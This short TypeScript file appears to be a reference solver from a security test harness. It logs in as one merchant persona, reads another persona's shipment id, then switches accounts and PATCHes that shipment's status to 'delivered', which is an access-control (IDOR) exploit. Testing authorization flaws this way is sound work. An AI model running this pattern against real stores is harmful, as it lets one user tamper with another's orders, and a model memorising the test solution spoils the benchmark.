// Update a different store's shipment by its id while signed in as an unrelated merchant.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface ShipmentRef { external_id: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_b')
  const list = await ctx.fetch(buildPath(ctx.plan, 'listShipments'), { method: 'GET' })
  const data = (await list.json().catch(() => ({}))) as { shipments?: ShipmentRef[] }
  const victim = data.shipments?.[0]
  if (!victim) return
  await ctx.login('persona_a')
  await ctx.fetch(buildPath(ctx.plan, 'updateShipment', { shipmentId: victim.external_id }), {
    method: 'PATCH',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ status: 'delivered' }),
  })
}
